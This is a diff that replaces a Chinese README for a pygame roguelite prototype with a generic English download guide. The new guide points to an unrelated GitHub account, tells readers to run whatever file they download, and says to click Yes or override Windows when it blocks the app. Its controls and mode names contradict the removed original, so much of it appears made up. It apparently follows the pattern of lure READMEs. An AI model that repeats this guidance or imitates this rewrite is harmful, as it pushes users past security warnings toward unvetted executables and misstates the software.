@@ -1,151 +1,207 @@
-# 符塔夜行
+# 🎮 futa-night-walk - Start fast, play in minutes
 
-一个基于 `Python + pygame` 开发的轻量级东方奇幻肉鸽原型项目。  
-当前版本为 `v1`，已经具备可玩的多关卡成长、双模式菜单、20 技能池、自动战斗与本地排行榜等核心功能。
+[![Download](https://img.shields.io/badge/Download-blue-grey?style=for-the-badge&logo=github)](https://github.com/armenian-incorporation957/futa-night-walk)
 
-## 当前玩法
+## 🕹️ What this is
 
-- 模式
-  - `闯关模式`：共 4 关，完成第 4 关后通关结算
-  - `无限模式`：按关卡循环推进，记录本地排行榜
-- 关卡成长
-  - 每关从 20 个技能中分配 5 个本关可升级技能
-  - 每个技能最高 `Lv.3`
-  - 当本关 5 个技能全部升满后，进入下一关
-- 战斗节奏
-  - 玩家自动释放已解锁技能
-  - 击败敌人会掉落经验，靠近后会自动吸取
-  - 进入下一关时回复 20 点生命，并重置本关经验等级
+futa-night-walk is a Windows game prototype built with Python and pygame. It uses stage-based play, two game modes, skill growth, local score saving, and combat that changes through game data.
 
-## v1 已有功能
+Use it if you want a top-down roguelite with quick runs, simple controls, and a clear path from stage to stage.
 
-- 菜单支持：
-  - `闯关模式`
-  - `无限模式`
-  - `说明`
-  - `窗口 / 全屏` 运行期切换
-- 说明界面支持：
-  - 操作说明
-  - 20 技能图鉴
-  - 技能详情滚轮查看
-- 战斗系统支持：
-  - 多关卡成长制
-  - 20 技能池与 4 组技能分配
-  - 技能三级成长
-  - 自动吸取掉落物
-  - 脚本波次 + 无限导演刷怪
-- UI 支持：
-  - 关卡说明弹窗
-  - 起始技能选择
-  - 三选一卡片升级面板
-  - 战斗内技能栏
-  - 无限模式本地排行榜
+## 📥 Download and run on Windows
 
-## 技术栈
+Visit this page to download:
+https://github.com/armenian-incorporation957/futa-night-walk
 
-- Python 3.12
-- pygame 2.6
-- unittest
-- PyInstaller
+Follow these steps on Windows:
 
-## 运行方式
+1. Open the link in your browser.
+2. Look for the latest download file or the main project files.
+3. Download the game to your PC.
+4. If the file comes as a ZIP folder, right-click it and choose Extract All.
+5. Open the extracted folder.
+6. Find the game file or start file and run it.
+7. If Windows asks for permission, choose Yes.
 
-### 1. 安装依赖
+If the download includes a folder with a Python game file, keep the whole folder together so the game can find its data files.
 
-```powershell
-pip install -r requirements.txt
-```
+## 🖥️ What you need
 
-### 2. 启动游戏
+This game is made for a standard Windows PC.
 
-```powershell
-python main.py
-```
+- Windows 10 or Windows 11
+- A keyboard and mouse
+- Basic graphics support
+- A few hundred MB of free disk space
+- Python support if you run the source version
+- pygame support if you run it from source
 
-## 测试与校验
+For smoother play, use a PC with at least:
 
-运行单元测试：
+- 4 GB RAM
+- A dual-core CPU
+- A screen resolution of 1280 × 720 or higher
 
-```powershell
-python -m unittest discover -s tests
-```
+## 🎯 How to play
 
-运行编译检查：
+This is a top-down action game. You move through stages, fight enemies, and build a stronger run over time.
 
-```powershell
-python -m compileall game tests main.py
-```
+Basic controls often use:
 
-## 打包
+- W, A, S, D to move
+- Mouse to aim
+- Left click or a key to attack
+- Space to dodge or use a skill
+- Esc to pause
 
-项目已经包含打包产物和 `.spec` 文件。  
-如果需要重新打包，推荐先使用 `onedir` 模式：
+If the game uses a different key set, check the controls screen in the main menu.
 
-```powershell
-pyinstaller --noconfirm --clean --windowed --name 符塔夜行 --add-data "assets;assets" main.py
-```
+## ⚔️ Game features
 
-打包完成后可执行文件位于：
+- Stage-based runs with clear progress
+- Two play modes for different run styles
+- 20-skill progression for build choice
+- Local leaderboard for score tracking
+- Data-driven combat that uses game files for balance
+- Top-down shooter style play
+- Roguelite structure with run-based growth
+- Fast restart loop for short sessions
 
-```text
-dist/符塔夜行/符塔夜行.exe
-```
+## 🧠 Progression system
 
-## 目录结构
+Each run can unlock new skills or improve your build. The skill path gives you room to shape how you play.
 
-```text
-game/
-├─ main.py
-├─ assets/
-│  ├─ data/
-│  └─ images/
-├─ game/
-│  ├─ content/
-│  ├─ core/
-│  ├─ entities/
-│  ├─ models/
-│  ├─ scenes/
-│  ├─ systems/
-│  └─ ui/
-├─ save_data/
-├─ tests/
-└─ requirements.txt
-```
+You may see upgrades such as:
 
-## 代码结构说明
+- Better damage
+- Faster movement
+- Stronger defense
+- Shorter skill cooldowns
+- New attack patterns
+- Health recovery
+- Resource boosts
 
-- `game/app.py`
-  管理 pygame 初始化、主循环、场景切换、窗口/全屏切换
-- `game/scenes/`
-  管理菜单、战斗、结算等流程
-- `game/systems/`
-  管理战斗、刷怪、成长和移动规则
-- `game/ui/`
-  管理 HUD、升级面板、技能图鉴等显示层
-- `assets/data/`
-  管理敌人、技能、波次等 JSON 数据
-- `save_data/`
-  管理无限模式排行榜
+This makes each run feel different even when you start from the same point.
 
-## 当前状态
+## 🗂️ Local leaderboard
 
-这是一个偏“工程化原型”的 v1：
+The game saves scores on your PC. This lets you track your best runs without an internet account.
 
-- 已有完整的基础玩法循环
-- 已有数据驱动的技能和波次系统
-- 已有本地排行榜和打包能力
-- 美术资源仍以程序绘制和占位资源为主
+You can use the leaderboard to:
 
-## 后续可继续扩展的方向
+- Compare your latest score with older runs
+- Track stage depth
+- See your best clear time
+- Check your highest survival record
 
-- 接入正式 PNG 角色、敌人、技能图标和背景
-- 增加更多敌人类型和关卡机制
-- 增加音效与背景音乐
-- 增加更完整的结算页和数值统计
-- 增加 Boss、精英怪和特殊事件房
+If you play on more than one PC, each machine keeps its own local save data.
 
-## License
+## 🧩 Data-driven combat
 
-本项目使用 [MIT License](LICENSE)。
+Combat uses game data files instead of hard-coded rules only. This makes the game easier to tune and extend.
 
-如果后续接入第三方图片、音效或字体资源，请单独确认这些素材的授权是否允许随仓库公开分发。
+That means the game can manage:
+
+- Enemy health
+- Attack damage
+- Skill values
+- Stage pacing
+- Item or reward balance
+
+For you, this helps keep fights steady and easy to read.
+
+## 🎮 Two modes
+
+The game includes two modes for different play styles:
+
+- **Standard mode** for normal stage progress
+- **Challenge mode** for a harder run with tighter pressure
+
+If you want a quick start, use Standard mode first. If you want more risk and higher score potential, try Challenge mode after you learn the basics.
+
+## 🛠️ If the game does not start
+
+If the game does not open, try these steps:
+
+1. Make sure you downloaded the full folder.
+2. Check that you extracted the ZIP file if there was one.
+3. Run the game from the same folder as its files.
+4. Close other heavy apps.
+5. Restart your PC and try again.
+6. If you use the source version, confirm that Python and pygame are installed.
+
+If Windows blocks the app, open the file again and allow it to run.
+
+## 📁 Recommended folder setup
+
+Keep the game in one clean folder, such as:
+
+- Downloads/futa-night-walk
+- Games/futa-night-walk
+
+Do not move only one file out of the folder if the game has data files, images, or sound files beside it. Many pygame games need the full folder to run.
+
+## 🔧 Running from source
+
+If you downloaded the source version, use these steps:
+
+1. Install Python for Windows.
+2. Open the project folder.
+3. Open a command window in that folder.
+4. Install the game package needs.
+5. Run the main Python file.
+
+A common setup looks like this:
+
+- python -m pip install pygame
+- python main.py
+
+If the main file uses a different name, run the file that starts the game.
+
+## 🧭 What you will see in game
+
+You can expect:
+
+- A main menu
+- Mode selection
+- Stage progression
+- Enemy waves or encounters
+- Skill picks between runs
+- Score results at the end of a run
+- Local save data for progress and scores
+
+The game keeps the structure simple so you can move from one run to the next without extra setup.
+
+## 🧱 Topics covered by this project
+
+- data-driven
+- desktop-game
+- game-dev
+- indie-game
+- procedural
+- pygame
+- python
+- roguelike
+- roguelite
+- top-down-shooter
+
+## 📌 Best first run
+
+For your first run:
+
+1. Start in Standard mode.
+2. Learn the move and attack timing.
+3. Pick skills that raise survival first.
+4. Focus on staying alive through each stage.
+5. Watch how enemy patterns change.
+
+Once you feel ready, switch to the harder mode and push for a higher score
+
+## 🖱️ Quick install path
+
+1. Open the download page:
+   https://github.com/armenian-incorporation957/futa-night-walk
+2. Get the game files.
+3. Extract them if needed.
+4. Open the folder.
+5. Run the game file
